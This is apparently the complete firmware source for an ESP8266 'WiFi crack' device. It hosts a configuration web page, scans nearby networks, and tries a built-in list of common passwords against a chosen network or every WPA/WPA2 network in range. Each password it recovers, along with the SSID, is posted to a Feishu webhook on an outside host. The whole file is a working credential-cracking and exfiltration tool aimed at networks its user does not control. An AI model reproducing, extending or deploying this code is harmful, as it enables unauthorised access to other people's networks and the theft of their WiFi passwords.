#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>
#include <WiFiClientSecure.h>
#include <EEPROM.h>

// === 配置区 (使用 constexpr 和 F() 提高效率) ===
constexpr const char* DEFAULT_AP_SSID = "WiFi_CRACK";
constexpr const char* DEFAULT_AP_PASSWORD = "P0ssw0rd";

// LED指示灯配置
#define LED_PIN 2  // ESP8266板载LED引脚（D4，低电平点亮）

// EEPROM 配置存储地址和大小
#define EEPROM_SIZE 4096
#define WEBHOOK_URL_ADDR 0
#define WEBHOOK_URL_MAX_LEN 255
#define PASSWORD_LIST_ADDR 512
#define PASSWORD_LIST_MAX_LEN 1023 // 1024 bytes including null terminator
#define AP_SSID_ADDR 1536
#define AP_SSID_MAX_LEN 31 // Standard SSID max length is 32, including null
#define AP_PASSWORD_ADDR 1792
#define AP_PASSWORD_MAX_LEN 63 // Standard password max length is 64, including null
#define TARGET_SSID_ADDR 2048
#define TARGET_SSID_MAX_LEN 31

ESP8266WebServer server(80);

// 默认密码字典 (放在 PROGMEM 中)
const char DEFAULT_PASSWORD_LIST[] PROGMEM = "12345678,123123123,1234567890,123456789,password,admin123,11111111,22222222,33333333,44444444,55555555,66666666,77777777,88888888,99999999,00000000,0987654321,123456123456,1234567890.,abc123123,iloveyou,87654321,lililili,qwertyuiop,asdfghjkl,zxcvbnm123,1q2w3e4r5t,1qaz2wsx3edc,1qaz2wsx,147258369,159357258,258369147,qazwsxedc,qwerty123,66668888,88886666,1234abcd,abcd1234,11223344,111111111,11111111,87654321,password123,12345678910";

// 默认飞书webhook
String webhookUrl = "https://open.feishu.cn/open-apis/bot/v2/hook/YOUR_HOOK_HERE";

// AP配置和目标WiFi (全局变量)
String currentApSsid = DEFAULT_AP_SSID;
String currentApPassword = DEFAULT_AP_PASSWORD;
String targetSsid = ""; // 空字符串表示破解全部WiFi
String passwordList = "";

// === 函数声明 ===
// Web Handlers
void handleRoot();
void handlePasswordConfig();
void handleWiFiScan();
void handleWebhookConfig();
void handleSavePasswords();
void handleSaveWebhook();
void handleStartCrack();
void handleApConfig();
void handleSaveApConfig();
void handleTargetWifi();
void handleSaveTargetWifi();

// Core Logic
void startCracking();
void crackSpecificNetwork(const String& ssidToCrack);
bool attemptConnection(const String& ssid, const String& pass, unsigned long timeoutMs = 15000);
void sendToFeishu(const String& ssid, const String& password);
String getIPAddress();
void restartApWithNewConfig();

// Utility & Helpers
String getHTMLHeader(const String& title);
String getHTMLFooter();
String getEncryptionType(uint8_t encType);
int getSignalLevel(int rssi);
String getSignalQuality(int rssi);
void loadConfigFromEEPROM();
void saveConfigToEEPROM();
void parsePasswordList(const String& input, String* outputArray, int maxElements, int& count);
void ledSetup();
void ledSlowBlink();
void ledFastBlinkSuccess();
void ledOff();

void setup() {
  Serial.begin(115200);
  Serial.println(F("\n--- WiFi Crack Tool Starting ---"));

  // 初始化LED
  ledSetup();

  // 初始化EEPROM
  EEPROM.begin(EEPROM_SIZE);

  // 从EEPROM读取配置
  loadConfigFromEEPROM();

  // 设置AP模式
  WiFi.persistent(false); // Avoid saving to flash on every mode change
  WiFi.mode(WIFI_AP_STA); // Start in AP+STA for scanning without disconnecting AP

  // 配置AP的IP地址和子网掩码
  IPAddress local_IP(192, 168, 4, 1);
  IPAddress gateway(192, 168, 4, 1);
  IPAddress subnet(255, 255, 255, 0);

  // 设置静态IP并启动AP
  WiFi.softAPConfig(local_IP, gateway, subnet);
  WiFi.softAP(currentApSsid.c_str(), currentApPassword.c_str());

  Serial.println(F("AP模式已启动"));
  Serial.print(F("SSID: "));
  Serial.println(currentApSsid);
  Serial.print(F("密码: "));
  Serial.println(currentApPassword);
  Serial.print(F("AP IP地址: "));
  Serial.println(WiFi.softAPIP());
  Serial.print(F("子网掩码: "));
  Serial.println(subnet.toString());
  Serial.print(F("网关: "));
  Serial.println(gateway.toString());

  // 设置Web服务器路由
  server.on("/", handleRoot);
  server.on("/password", handlePasswordConfig);
  server.on("/wifi-scan", handleWiFiScan);
  server.on("/webhook", handleWebhookConfig);
  server.on("/ap-config", handleApConfig);
  server.on("/target-wifi", handleTargetWifi);
  server.on("/save-passwords", HTTP_POST, handleSavePasswords);
  server.on("/save-webhook", HTTP_POST, handleSaveWebhook);
  server.on("/save-ap-config", HTTP_POST, handleSaveApConfig);
  server.on("/save-target-wifi", HTTP_POST, handleSaveTargetWifi);
  server.on("/start-crack", handleStartCrack);

  server.begin();
  Serial.println(F("Web服务器已启动"));
  Serial.println(F("访问 http://192.168.4.1 进行配置"));
  Serial.println(F("--- Setup Complete ---\n"));
}

void loop() {
  server.handleClient();
  yield(); // Allow background tasks
}

// === EEPROM 操作 ===

void loadConfigFromEEPROM() {
  Serial.println(F("Loading config from EEPROM..."));
  
  // Helper lambda to read string from EEPROM with length check
  auto readString = [](int addr, int maxLen, String& outputStr) {
    outputStr = "";
    for (int i = 0; i < maxLen; i++) {
      char c = EEPROM.read(addr + i);
      if (c == 0) break;
      outputStr += c;
    }
  };

  readString(WEBHOOK_URL_ADDR, WEBHOOK_URL_MAX_LEN, webhookUrl);
  readString(PASSWORD_LIST_ADDR, PASSWORD_LIST_MAX_LEN, passwordList);
  readString(AP_SSID_ADDR, AP_SSID_MAX_LEN, currentApSsid);
  readString(AP_PASSWORD_ADDR, AP_PASSWORD_MAX_LEN, currentApPassword);
  readString(TARGET_SSID_ADDR, TARGET_SSID_MAX_LEN, targetSsid);
  
  // If no password list was loaded, use the default one from PROGMEM
  if (passwordList.length() == 0) {
      Serial.println(F("No password list found in EEPROM, loading default."));
      // Load default password list from PROGMEM
      char buffer[sizeof(DEFAULT_PASSWORD_LIST)];
      strcpy_P(buffer, DEFAULT_PASSWORD_LIST); // Copy from PROGMEM to RAM
      passwordList = String(buffer);
  }
  
  Serial.println(F("Config loaded from EEPROM."));
}

void saveConfigToEEPROM() {
  Serial.println(F("Saving config to EEPROM..."));
  
  // Helper lambda to write string to EEPROM with length and null termination check
  auto writeString = [](int addr, int maxLen, const String& inputStr) {
    int len = inputStr.length();
    if (len > maxLen) len = maxLen; // Prevent overflow
    
    for (int i = 0; i < len; i++) {
        EEPROM.write(addr + i, inputStr[i]);
    }
    EEPROM.write(addr + len, 0); // Null terminate
  };
  
  writeString(WEBHOOK_URL_ADDR, WEBHOOK_URL_MAX_LEN, webhookUrl);
  writeString(PASSWORD_LIST_ADDR, PASSWORD_LIST_MAX_LEN, passwordList);
  writeString(AP_SSID_ADDR, AP_SSID_MAX_LEN, currentApSsid);
  writeString(AP_PASSWORD_ADDR, AP_PASSWORD_MAX_LEN, currentApPassword);
  writeString(TARGET_SSID_ADDR, TARGET_SSID_MAX_LEN, targetSsid);
  
  EEPROM.commit();
  Serial.println(F("Config saved to EEPROM."));
}


// === 密码列表解析 ===
// Parses comma or newline separated passwords into an array
void parsePasswordList(const String& input, String* outputArray, int maxElements, int& count) {
    count = 0;
    String currentPass = "";
    
    for (unsigned int i = 0; i <= input.length(); i++) { // <= to process last item
        char c = (i < input.length()) ? input.charAt(i) : ','; // Add a delimiter at the end
        
        if (c == ',' || c == '\n' || c == '\r') {
            currentPass.trim(); // Clean up whitespace
            if (currentPass.length() > 0 && count < maxElements) {
                outputArray[count++] = currentPass;
            }
            currentPass = "";
        } else {
            currentPass += c;
        }
    }
    // No need to add final 'currentPass' as we forced a delimiter above
}


// === Web Handlers ===

void handleRoot() {
  String html = getHTMLHeader(F("WiFi破解工具 - 主页"));
  html += F("<div class='container'><h1>WiFi破解工具</h1><div class='status-card'><h2>系统状态</h2>");
  html += F("<p><strong>AP名称:</strong> "); html += currentApSsid; html += F("</p>");
  html += F("<p><strong>AP密码:</strong> "); html += currentApPassword; html += F("</p>");
  html += F("<p><strong>AP IP地址:</strong> "); html += WiFi.softAPIP().toString(); html += F("</p>");
  html += F("<p><strong>子网掩码:</strong> 255.255.255.0</p>");
  html += F("<p><strong>网关:</strong> 192.168.4.1</p>");
  html += F("<p><strong>DHCP范围:</strong> 192.168.4.2 - 192.168.4.254</p>");

  int clientCount = WiFi.softAPgetStationNum();
  html += F("<p><strong>已连接客户端:</strong> "); html += String(clientCount); html += F(" 个</p>");

  // Count passwords robustly
  int passwordCount = 0;
  String dummyArray[1]; // We don't need the array itself, just the count
  parsePasswordList(passwordList, dummyArray, 1, passwordCount);
  html += F("<p><strong>密码字典数量:</strong> "); html += String(passwordCount); html += F(" 个</p>");

  html += F("<p><strong>飞书通知:</strong> ");
  html += (webhookUrl.indexOf(F("YOUR_HOOK_HERE")) == -1 ? F("已配置") : F("未配置"));
  html += F("</p></div><div class='menu-grid'>");

  html += F("<a href='/ap-config' class='menu-item'><h3>AP配置管理</h3><p>修改AP名称和密码</p></a>");
  html += F("<a href='/password' class='menu-item'><h3>密码字典配置</h3><p>管理密码字典列表</p></a>");
  html += F("<a href='/wifi-scan' class='menu-item'><h3>WiFi扫描</h3><p>查看附近WiFi网络</p></a>");
  html += F("<a href='/target-wifi' class='menu-item'><h3>目标WiFi设置</h3><p>指定要破解的WiFi</p></a>");
  html += F("<a href='/webhook' class='menu-item'><h3>飞书通知配置</h3><p>设置飞书机器人</p></a>");
  html += F("<a href='/start-crack' class='menu-item start-crack'><h3>开始破解</h3><p>启动WiFi破解程序</p></a>");

  html += F("</div></div>"); html += getHTMLFooter();
  server.send(200, F("text/html"), html);
}

void handlePasswordConfig() {
  String html = getHTMLHeader(F("密码字典配置"));
  html += F("<div class='container'><h1>密码字典配置</h1><form action='/save-passwords' method='post'><div class='form-group'>");
  html += F("<label for='passwords'>密码列表（每行一个密码或用逗号分隔）:</label>");
  html += F("<textarea id='passwords' name='passwords' rows='15' style='width:100%'>"); html += passwordList; html += F("</textarea>");
  html += F("</div><button type='submit' class='btn'>保存配置</button><a href='/' class=\"btn btn-secondary\">返回主页</a></form></div>");
  html += getHTMLFooter();
  server.send(200, F("text/html"), html);
}

void handleWiFiScan() {
  String html = getHTMLHeader(F("WiFi网络扫描"));
  html += F("<div class='container'><h1>附近WiFi网络</h1>");

  // Scan networks (STA mode, but AP stays active)
  int n = WiFi.scanNetworks(false, true); // async=false, show_hidden=true

  html += F("<div class='scan-info'><p><strong>发现网络数量:</strong> "); html += String(n); html += F(" 个</p></div>");

  if (n == 0) {
    html += F("<p class='no-networks'>未发现任何WiFi网络</p>");
  } else {
    html += F("<div class='wifi-list'>");
    for (int i = 0; i < n; i++) {
      String ssid = WiFi.SSID(i);
      int rssi = WiFi.RSSI(i);
      String encryption = getEncryptionType(WiFi.encryptionType(i));

      html += F("<div class='wifi-item'><div class='wifi-header'><span class='ssid'>"); html += ssid;
      html += F("</span><span class='signal-strength signal-"); html += String(getSignalLevel(rssi));
      html += F("'>"); html += String(rssi); html += F(" dBm</span></div><div class='wifi-details'>");
      html += F("<p><strong>加密方式:</strong> "); html += encryption; html += F("</p>");
      html += F("<p><strong>信号强度:</strong> "); html += String(rssi); html += F(" dBm ("); html += getSignalQuality(rssi); html += F(")</p>");
      html += F("<p><strong>频道:</strong> "); html += String(WiFi.channel(i)); html += F("</p>");
      html += F("<p><strong>MAC地址:</strong> "); html += WiFi.BSSIDstr(i); html += F("</p></div></div>");
    }
    html += F("</div>");
  }

  html += F("<div style='margin-top:20px;'><a href='/wifi-scan' class='btn'>重新扫描</a><a href='/' class=\"btn btn-secondary\">返回主页</a></div></div>");
  html += getHTMLFooter();
  server.send(200, F("text/html"), html);
}

void handleWebhookConfig() {
  String html = getHTMLHeader(F("飞书通知配置"));
  html += F("<div class='container'><h1>飞书机器人配置</h1><form action='/save-webhook' method='post'><div class='form-group'>");
  html += F("<label for='webhook'>飞书Webhook URL:</label>");
  html += F("<input type='text' id='webhook' name='webhook' value='"); html += webhookUrl; html += F("' style='width:100%'>");
  html += F("<small>格式: https://open.feishu.cn/open-apis/bot/v2/hook/your-hook-id</small>");
  html += F("</div><button type='submit' class='btn'>保存配置</button><a href='/' class=\"btn btn-secondary\">返回主页</a></form></div>");
  html += getHTMLFooter();
  server.send(200, F("text/html"), html);
}

void handleSavePasswords() {
  if (!server.hasArg(F("passwords"))) {
    server.send(400, F("text/html"), F("<h1>Bad Request: Missing 'passwords' parameter</h1>"));
    return;
  }
  
  passwordList = server.arg(F("passwords"));
  // Normalize line endings and remove carriage returns if present
  passwordList.replace(F("\r\n"), F(","));
  passwordList.replace(F("\n"), F(","));
  passwordList.replace(F("\r"), F(",")); // Just in case
  
  saveConfigToEEPROM();

  String html = getHTMLHeader(F("保存成功"));
  html += F("<div class='container'><h1>保存成功</h1><p>密码字典已成功保存！</p>");
  html += F("<a href='/password' class='btn'>返回配置</a><a href='/' class=\"btn btn-secondary\">返回主页</a></div>");
  html += getHTMLFooter();
  server.send(200, F("text/html"), html);
}

void handleSaveWebhook() {
  if (!server.hasArg(F("webhook"))) {
     server.send(400, F("text/html"), F("<h1>Bad Request: Missing 'webhook' parameter</h1>"));
     return;
  }
  
  webhookUrl = server.arg(F("webhook"));
  saveConfigToEEPROM();

  String html = getHTMLHeader(F("保存成功"));
  html += F("<div class='container'><h1>保存成功</h1><p>飞书Webhook URL已成功保存！</p>");
  html += F("<a href='/webhook' class='btn'>返回配置</a><a href='/' class=\"btn btn-secondary\">返回主页</a></div>");
  html += getHTMLFooter();
  server.send(200, F("text/html"), html);
}

void handleStartCrack() {
  String html = getHTMLHeader(F("开始破解"));
  html += F("<div class='container'><h1>WiFi破解程序已启动</h1>");
  html += F("<p>破解程序正在后台运行，请查看串口输出获取详细信息。</p>");
  html += F("<p>破解完成后设备将进入深度睡眠模式。</p>");
  html += F("<a href='/' class=\"btn\">返回主页</a></div>");
  html += getHTMLFooter();
  server.send(200, F("text/html"), html);

  delay(1000); // Give time for page to load before starting blocking task
  startCracking();
}

void handleApConfig() {
  String html = getHTMLHeader(F("AP配置管理"));
  html += F("<div class='container'><h1>AP配置管理</h1><form action='/save-ap-config' method='post'><div class='form-group'>");
  html += F("<label for='ap-ssid'>AP名称 (SSID):</label>");
  html += F("<input type='text' id='ap-ssid' name='ap-ssid' value='"); html += currentApSsid; html += F("' style='width:100%'>");
  html += F("<small>修改后需要重启AP生效</small></div><div class='form-group'>");
  html += F("<label for='ap-password'>AP密码:</label>");
  html += F("<input type='password' id='ap-password' name='ap-password' value='"); html += currentApPassword; html += F("' style='width:100%'>");
  html += F("<small>最少8位字符</small></div>");
  html += F("<button type='submit' class='btn'>保存配置并重启AP</button><a href='/' class=\"btn btn-secondary\">返回主页</a></form></div>");
  html += getHTMLFooter();
  server.send(200, F("text/html"), html);
}

void handleSaveApConfig() {
  if (!server.hasArg(F("ap-ssid")) || !server.hasArg(F("ap-password"))) {
     server.send(400, F("text/html"), F("<h1>Bad Request: Missing parameters</h1>"));
     return;
  }
  
  String newApSsid = server.arg(F("ap-ssid"));
  String newApPassword = server.arg(F("ap-password"));

  // Validate input
  if (newApSsid.length() == 0) newApSsid = DEFAULT_AP_SSID;
  if (newApPassword.length() < 8) newApPassword = DEFAULT_AP_PASSWORD;

  currentApSsid = newApSsid;
  currentApPassword = newApPassword;

  saveConfigToEEPROM();

  String html = getHTMLHeader(F("AP配置已保存"));
  html += F("<div class='container'><h1>AP配置已保存</h1>");
  html += F("<p>新的AP配置已保存到EEPROM，正在重启AP...</p>");
  html += F("<p><strong>新AP名称:</strong> "); html += currentApSsid; html += F("</p>");
  html += F("<p><strong>新AP密码:</strong> "); html += currentApPassword; html += F("</p>");
  html += F("<p>请等待几秒钟后重新连接新的WiFi网络</p>");
  html += F("<a href='/' class='btn'>返回主页</a></div>");
  html += getHTMLFooter();
  server.send(200, F("text/html"), html);

  delay(2000); // Ensure response is sent
  restartApWithNewConfig();
}

void handleTargetWifi() {
  String html = getHTMLHeader(F("目标WiFi设置"));
  html += F("<div class='container'><h1>目标WiFi设置</h1><div class='form-group'>");
  html += F("<a href='/target-wifi' class='btn'>重新扫描WiFi</a></div>");

  int n = WiFi.scanNetworks(false, true); // async=false, show_hidden=true

  html += F("<form action='/save-target-wifi' method='post'><div class='form-group'><label>选择要破解的WiFi网络:</label>");
  html += F("<div style='margin:10px 0;'><label><input type='radio' name='target-ssid' value='' ");
  html += (targetSsid.length() == 0 ? F("checked") : F(""));
  html += F("> 破解所有发现的WiFi网络</label></div>");

  if (n == 0) {
    html += F("<p class='no-networks'>未发现任何WiFi网络</p>");
  } else {
    html += F("<div class='wifi-list' style='max-height:400px; overflow-y:auto; border:1px solid #ddd; padding:10px; border-radius:4px;'>");
    for (int i = 0; i < n; i++) {
      String ssid = WiFi.SSID(i);
      int rssi = WiFi.RSSI(i);
      String encryption = getEncryptionType(WiFi.encryptionType(i));

      html += F("<div class='wifi-item' style='padding:10px; margin-bottom:5px; border:1px solid #eee; border-radius:4px;'>");
      html += F("<label style='display:flex; align-items:center; cursor:pointer;'><input type='radio' name='target-ssid' value='");
      html += ssid; html += F("' ");
      html += (targetSsid == ssid ? F("checked") : F(""));
      html += F(" style='margin-right:10px;'><div><strong>"); html += ssid;
      html += F("</strong><div style='font-size:12px; color:#666;'>信号: "); html += String(rssi);
      html += F(" dBm ("); html += getSignalQuality(rssi); html += F(") | 加密: "); html += encryption;
      html += F("</div></div></label></div>");
    }
    html += F("</div>");
  }

  html += F("<small>选择要破解的WiFi网络，或选择'破解所有发现的WiFi网络'进行全量破解</small></div>");
  html += F("<button type='submit' class='btn'>保存设置</button><a href='/' class=\"btn btn-secondary\">返回主页</a></form></div>");
  html += getHTMLFooter();
  server.send(200, F("text/html"), html);
}

void handleSaveTargetWifi() {
  if (!server.hasArg(F("target-ssid"))) {
     server.send(400, F("text/html"), F("<h1>Bad Request: Missing 'target-ssid' parameter</h1>"));
     return;
  }
  
  targetSsid = server.arg(F("target-ssid")); // Can be empty string
  saveConfigToEEPROM();

  String html = getHTMLHeader(F("目标WiFi已保存"));
  html += F("<div class='container'><h1>目标WiFi已保存</h1>");
  if (targetSsid.length() > 0) {
    html += F("<p>已设置目标WiFi: <strong>"); html += targetSsid; html += F("</strong></p>");
    html += F("<p>破解程序将只针对该WiFi网络进行破解。</p>");
  } else {
    html += F("<p>已设置为破解全部WiFi网络。</p>");
  }
  html += F("<a href='/start-crack' class='btn'>开始破解</a><a href='/' class=\"btn btn-secondary\">返回主页</a></div>");
  html += getHTMLFooter();
  server.send(200, F("text/html"), html);
}


// === 核心破解逻辑 ===

void startCracking() {
  Serial.println(F("\n=== WiFi密码破解程序启动 ==="));

  // LED指示：开始破解，快速闪烁
  ledFastBlinkSuccess();

  // 1. 扫描附近WiFi网络 (in STA mode, AP remains)
  Serial.println(F("正在扫描附近WiFi网络..."));
  WiFi.mode(WIFI_STA); // Temporarily switch to STA only for scan
  WiFi.disconnect();
  delay(100);

  int n = WiFi.scanNetworks();
  Serial.printf("扫描完成，发现 %d 个网络\n", n);

  if (n <= 0) {
    Serial.println(F("未发现任何WiFi网络，程序结束"));
    WiFi.mode(WIFI_AP); // Restore AP mode
    WiFi.softAP(currentApSsid.c_str(), currentApPassword.c_str());
    return;
  }

  // 2. 显示扫描结果
  Serial.println(F("\n=== 扫描结果 ==="));
  for (int i = 0; i < n; i++) {
    Serial.printf("%d: %s (%ddBm) %s\n",
                  i + 1,
                  WiFi.SSID(i).c_str(),
                  WiFi.RSSI(i),
                  getEncryptionType(WiFi.encryptionType(i)).c_str());
  }

  // 3. 决定破解哪些网络
  if (targetSsid.length() > 0) {
    // 如果指定了目标WiFi，只破解这一个
    Serial.printf("查找指定目标WiFi: %s\n", targetSsid.c_str());
    bool found = false;
    for (int i = 0; i < n; i++) {
      if (WiFi.SSID(i) == targetSsid) {
        Serial.printf("找到指定目标WiFi: %s\n", targetSsid.c_str());
        found = true;
        crackSpecificNetwork(targetSsid);
        break; // Only crack the one specified
      }
    }
    if (!found) {
       Serial.printf("未找到指定的目标WiFi '%s'，程序结束\n", targetSsid.c_str());
    }
  } else {
    // 未指定目标WiFi，破解所有发现的 WPA/WPA2 网络
    Serial.println(F("未指定目标WiFi，将破解所有发现的 WPA/WPA2 网络"));
    bool anyAttempted = false;
    for (int i = 0; i < n; i++) {
        uint8_t encType = WiFi.encryptionType(i);
        if (encType == ENC_TYPE_TKIP || encType == ENC_TYPE_CCMP) {
             Serial.printf("开始破解网络: %s\n", WiFi.SSID(i).c_str());
             anyAttempted = true;
             crackSpecificNetwork(WiFi.SSID(i));
             // Optionally add a small delay between cracking attempts?
             // delay(5000);
        }
    }
    if (!anyAttempted) {
         Serial.println(F("未找到任何 WPA/WPA2 加密的网络进行破解。"));
    }
  }

  // Check for open networks if nothing was cracked successfully yet (optional)
  // This part can be tricky as it requires connecting to each network.
  // A simpler approach might be just to log them during the scan phase.

  Serial.println(F("\n=== 所有指定破解任务已完成 ==="));
  Serial.println(F("破解程序完成，准备重置..."));

  // 重置WiFi模式回AP
  WiFi.mode(WIFI_AP);
  WiFi.softAP(currentApSsid.c_str(), currentApPassword.c_str());
  Serial.println(F("恢复AP模式，等待下一次操作"));
  Serial.println(F("=== 程序结束 ==="));
}


void crackSpecificNetwork(const String& ssidToCrack) {
    Serial.printf("\n--- 开始破解单个网络: %s ---\n", ssidToCrack.c_str());

    // 4. 解析密码字典
    static String passwords[100]; // Static to avoid stack issues, but still limited
    int passwordCount = 0;
    parsePasswordList(passwordList, passwords, 100, passwordCount);
    Serial.printf("密码字典解析完成，共 %d 个密码\n", passwordCount);

    if (passwordCount == 0) {
        Serial.println(F("密码字典为空，跳过此网络。"));
        return;
    }

    // 5. 尝试连接
    bool success = false;
    String foundPassword = "";

    for (int i = 0; i < passwordCount; i++) {
        Serial.printf("尝试密码 %d/%d: %s\n", i + 1, passwordCount, passwords[i].c_str());

        if (attemptConnection(ssidToCrack, passwords[i], 15000)) { // Use helper function
            success = true;
            foundPassword = passwords[i];
            Serial.println(F("\n--- 连接成功！ ---"));
            
            // LED指示：连接成功，快闪
            ledFastBlinkSuccess();
            delay(2000); // Keep LED on briefly
            
            break; // Stop on first success
        } else {
            Serial.println(F(" [失败或超时]"));
            WiFi.disconnect();
            delay(2000); // Wait before next attempt
        }
    }

    // 6. 处理结果
    if (success) {
        Serial.printf("\n=== 破解成功 ===\n");
        Serial.printf("SSID: %s\n", ssidToCrack.c_str());
        Serial.printf("密码: %s\n", foundPassword.c_str());
        Serial.printf("IP地址: %s\n", WiFi.localIP().toString().c_str());

        // 发送飞书通知
        if (webhookUrl.indexOf(F("YOUR_HOOK_HERE")) == -1) {
            Serial.println(F("发送飞书通知..."));
            sendToFeishu(ssidToCrack, foundPassword);
        }

        // 保持连接状态一段时间以便观察
        delay(10000);
        WiFi.disconnect(); // Disconnect after observing

    } else {
        Serial.printf("\n=== 对网络 '%s' 破解失败 ===\n", ssidToCrack.c_str());
        Serial.println(F("所有密码尝试失败"));

        // 检查是否是开放网络 (Try once with no password)
        Serial.println(F("检查是否为开放网络..."));
        if (attemptConnection(ssidToCrack, "", 10000)) { // Shorter timeout for open net check
            Serial.println(F("发现开放网络，无需密码"));
            if (webhookUrl.indexOf(F("YOUR_HOOK_HERE")) == -1) {
                sendToFeishu(ssidToCrack, "");
            }
            delay(5000); // Brief connection
            WiFi.disconnect();
        } else {
             Serial.println(F("网络不是开放的，或者无法连接。"));
        }
    }
    Serial.printf("--- 完成对网络 '%s' 的破解尝试 ---\n", ssidToCrack.c_str());
}


// Helper function to attempt WiFi connection with timeout
bool attemptConnection(const String& ssid, const String& pass, unsigned long timeoutMs) {
    WiFi.begin(ssid.c_str(), pass.c_str());

    unsigned long startTime = millis();
    wl_status_t status;

    do {
        status = WiFi.status();
        if (status == WL_CONNECTED) {
            return true;
        } else if (status == WL_CONNECT_FAILED || status == WL_NO_SSID_AVAIL) {
            // Definitely failed
            return false;
        }
        
        // LED慢闪指示破解中
        ledSlowBlink();
        
        delay(500); // Check every 500ms
    } while (millis() - startTime < timeoutMs);

    // Timeout reached
    return false;
}


// === 飞书通知 ===

void sendToFeishu(const String& ssid, const String& password) {
  WiFiClientSecure client;
  client.setInsecure(); // 忽略SSL证书验证

  HTTPClient https;
  if (https.begin(client, webhookUrl)) {
    https.addHeader("Content-Type", "application/json; charset=utf-8");
    String json = "{\"msg_type\":\"text\",\"content\":{\"text\":\"[WiFi破解成功]\\nSSID: ";
    json += ssid;
    json += "\\nPassword: ";
    json += password;
    json += "\"}}";

    int code = https.POST(json);
    Serial.printf("飞书通知返回码: %d\n", code);
    https.end();
  }
}


// === 辅助函数 ===

String getIPAddress() {
  WiFiClient client;
  HTTPClient http;

  String ipv4 = F("未知");
  String ipv6 = F("未知");

  // 获取 IPv4 地址
  if (http.begin(client, F("http://4.ipw.cn"))) {
    int code = http.GET();
    if (code == 200) {
      ipv4 = http.getString();
      ipv4.trim();
    }
    http.end();
  }
  delay(500);

  // 获取 IPv6 地址
  if (http.begin(client, F("http://6.ipw.cn"))) {
    int code = http.GET();
    if (code == 200) {
      ipv6 = http.getString();
      ipv6.trim();
    }
    http.end();
  }
  client.stop(); // Explicitly stop the client

  return F("IPv4: ") + ipv4 + F("\nIPv6: ") + ipv6;
}

String getEncryptionType(uint8_t encType) {
  switch (encType) {
    case ENC_TYPE_NONE: return F("无加密");
    case ENC_TYPE_WEP: return F("WEP");
    case ENC_TYPE_TKIP: return F("WPA");
    case ENC_TYPE_CCMP: return F("WPA2");
    case ENC_TYPE_AUTO: return F("混合/自动协商");
    default: return F("未知");
  }
}

int getSignalLevel(int rssi) {
  if (rssi >= -50) return 4;
  else if (rssi >= -60) return 3;
  else if (rssi >= -70) return 2;
  else return 1;
}

String getSignalQuality(int rssi) {
  if (rssi >= -50) return F("优秀");
  else if (rssi >= -60) return F("良好");
  else if (rssi >= -70) return F("一般");
  else return F("差");
}

String getHTMLHeader(const String& title) {
  String html = F(R"rawliteral(<!DOCTYPE html><html lang="zh-CN"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>)rawliteral");
  html += title;
  html += F(R"rawliteral(</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: Arial, sans-serif; background: #f5f5f5; color: #333; }
.container { max-width: 800px; margin: 0 auto; padding: 20px; }
h1 { color: #2c3e50; margin-bottom: 20px; }
.status-card { background: white; padding: 20px; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
.menu-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; }
.menu-item { background: white; padding: 20px; border-radius: 8px; text-decoration: none; color: #333; box-shadow: 0 2px 4px rgba(0,0,0,0.1); transition: transform 0.2s; }
.menu-item:hover { transform: translateY(-2px); box-shadow: 0 4px 8px rgba(0,0,0,0.2); }
.menu-item.start-crack { background: #e74c3c; color: white; }
.form-group { margin-bottom: 20px; }
label { display: block; margin-bottom: 5px; font-weight: bold; }
input, textarea { padding: 10px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; width: 100%; }
.btn { display: inline-block; padding: 10px 20px; background: #3498db; color: white; text-decoration: none; border-radius: 4px; margin-right: 10px; border: none; cursor: pointer; }
.btn:hover { background: #2980b9; }
.btn-secondary { background: #95a5a6; }
.btn-secondary:hover { background: #7f8c8d; }
.wifi-list { margin-top: 20px; }
.wifi-item { background: white; padding: 15px; border-radius: 8px; margin-bottom: 10px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
.wifi-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
.ssid { font-weight: bold; font-size: 16px; }
.signal-strength { padding: 2px 8px; border-radius: 4px; color: white; font-size: 12px; }
.signal-4 { background: #27ae60; } /* 优秀 */
.signal-3 { background: #f39c12; } /* 良好 */
.signal-2 { background: #e67e22; } /* 一般 */
.signal-1 { background: #e74c3c; } /* 差 */
.wifi-details p { margin-bottom: 5px; font-size: 14px; }
.no-networks { color: #7f8c8d; font-style: italic; }
</style></head><body>)rawliteral");
  return html;
}

String getHTMLFooter() {
  return F("</body></html>");
}

void restartApWithNewConfig() {
  Serial.println(F("正在重启AP..."));

  // 关闭现有AP
  WiFi.softAPdisconnect(true);
  delay(1000);

  // 重新配置AP
  WiFi.mode(WIFI_AP);

  // 配置AP的IP地址和子网掩码
  IPAddress local_IP(192, 168, 4, 1);
  IPAddress gateway(192, 168, 4, 1);
  IPAddress subnet(255, 255, 255, 0);

  // 设置静态IP并启动AP
  WiFi.softAPConfig(local_IP, gateway, subnet);
  WiFi.softAP(currentApSsid.c_str(), currentApPassword.c_str());

  Serial.println(F("AP已重启"));
  Serial.print(F("新SSID: "));
  Serial.println(currentApSsid);
  Serial.print(F("新密码: "));
  Serial.println(currentApPassword);
  Serial.print(F("AP IP地址: "));
  Serial.println(WiFi.softAPIP());
}

// === LED控制函数实现 ===

void ledSetup() {
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH); // 初始状态熄灭（ESP8266板载LED低电平点亮）
  Serial.println(F("LED指示灯已初始化"));
}

void ledSlowBlink() {
  static unsigned long lastToggle = 0;
  const unsigned long interval = 500; // ms
  if (millis() - lastToggle > interval) {
      digitalWrite(LED_PIN, !digitalRead(LED_PIN)); // Toggle
      lastToggle = millis();
  }
}

void ledFastBlinkSuccess() {
  Serial.println(F("LED快闪：连接成功！"));
  for (int i = 0; i < 15; i++) {
    digitalWrite(LED_PIN, LOW); // 点亮
    delay(100);
    digitalWrite(LED_PIN, HIGH); // 熄灭
    delay(100);
  }
}

void ledOff() {
  digitalWrite(LED_PIN, HIGH); // 熄灭
}